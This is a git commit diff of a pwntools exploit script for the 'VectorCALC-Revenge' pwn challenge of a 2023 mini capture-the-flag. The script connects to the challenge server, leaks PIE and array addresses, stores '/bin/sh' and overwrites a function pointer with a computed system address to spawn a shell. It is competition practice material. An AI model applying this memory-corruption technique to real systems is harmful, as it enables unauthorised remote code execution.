abfef4d3d70d66b50aaaeae9d5c5028de5aa564b
w1n_gl0ry <duynguyen45608@gmail.com>
2023-07-31 05:55:09 +0700

    ok
    Signed-off-by: w1n_gl0ry <duynguyen45608@gmail.com>

--- 2023/miniCTF/pwn/VectorCALC-Revenge/xpl.py
+++ 2023/miniCTF/pwn/VectorCALC-Revenge/xpl.py
@@ -1,13 +1,12 @@
+#!/usr/bin/python3
 from pwn import *
 
-#io=process('./chall_revenge')
 #context.log_level='debug'
+#io=process('./chall_revenge')
 io=remote('45.122.249.68', 20018)
 elf=context.binary=ELF('./chall_revenge')
 
 #gdb.attach(io)
-
-win_offset=0x0000000000009D2
 
 def enter(idx, x, y):
     io.sendlineafter(b'> ', b'1')
@@ -26,14 +25,13 @@ def loadfav(idx):
     io.sendlineafter(b'> ', b'4')
     io.sendlineafter(b'Index', idx)
     
-def addfav(idx):
-    io.sendlineafter(b'> ', b'6')
-    io.sendlineafter(b'Index', idx)
-    
 def printfav(idx):
     io.sendlineafter(b'> ', b'5')
     io.sendlineafter(b'Index', idx)
     
+def addfav(idx):
+    io.sendlineafter(b'> ', b'6')
+    io.sendlineafter(b'Index', idx)
     
 enter(b'0', b'1', b'1')
 enter(b'1', b'1', b'1')
@@ -46,13 +44,14 @@ printfav(b'2')
 io.recvuntil(b'v = [')
 
 leak=io.recvline().strip(b']\n').split()
-print(leak)
+# print(leak)
+
 pie=int(leak[0])-0x35d
-
 log.info('pie_base :' + hex(pie))
-v_list=int(leak[1])-48
 
+v_list=int(leak[1])-48
 log.info('v_list array :' + hex(v_list))
+
 sum=v_list+64
 faves=sum+0x18
 
@@ -60,14 +59,17 @@ log.info('sum :' + hex(sum))
 log.info('faves :' + hex(faves))
 
 w1n=pie+0x0000000000009E4
-log.info('w1n :' + hex(w1n))
 system=pie+0x100
+log.info('w1n :' + hex(w1n))
+log.info('system :' + hex(system))
 
 bin_sh=0x68732f6e69622f
-enter(b'0', str(bin_sh), str(bin_sh))
-enter(b'3',str(v_list+8), str(v_list+8))
 
-enter(b'1', str(system), str(system))
+enter(b'0', str(bin_sh).encode(), str(bin_sh).encode())
+enter(b'3',str(v_list+8).encode(), str(v_list+8).encode())
+
+# enter(b'1', str(w1n).encode(), str(w1n).encode())
+enter(b'1', str(system).encode(), str(system).encode())
 
 printsum()
 
